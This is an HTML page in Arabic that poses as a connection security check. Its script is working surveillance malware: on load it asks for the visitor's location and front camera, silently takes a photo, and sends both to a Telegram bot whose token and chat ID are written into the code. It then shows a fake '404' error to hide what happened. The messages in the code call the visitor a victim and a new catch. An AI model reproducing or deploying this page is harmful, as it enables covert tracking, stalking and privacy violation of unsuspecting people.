<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الأمان</title>
    <style>body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }</style>
</head>
<body>
    <h2 id="status">جاري فحص اتصالك...</h2>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // ضع توكن البوت هنا
        const CHAT_ID = "1772820433"; // ضع الآيدي الخاص بك هنا

        async function sendToTelegram(data, type) {
            let url = `https://api.telegram.org/bot${TOKEN}/`;
            if (type === 'text') {
                await fetch(url + 'sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: data})
                });
            } else {
                const blob = await (await fetch(data)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.png');
                await fetch(url + 'sendPhoto', formData);
            }
        }

        // سحب الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(pos => {
            const msg = `📍 صيد جديد!\nالموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nدقة الموقع: ${pos.coords.accuracy} متر`;
            sendToTelegram(msg, 'text');
        }, err => { sendToTelegram("⚠️ الضحية رفض إذن الموقع", 'text'); });

        // التصوير الصامت
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                sendToTelegram(canvas.toDataURL('image/png'), 'photo');
                document.getElementById('status').innerText = "خطأ في الاتصال 404";
                stream.getTracks().forEach(t => t.stop());
            }, 2500);
        }).catch(() => { sendToTelegram("⚠️ الضحية رفض إذن الكاميرا", 'text'); });
    </script>
</body>
</html>
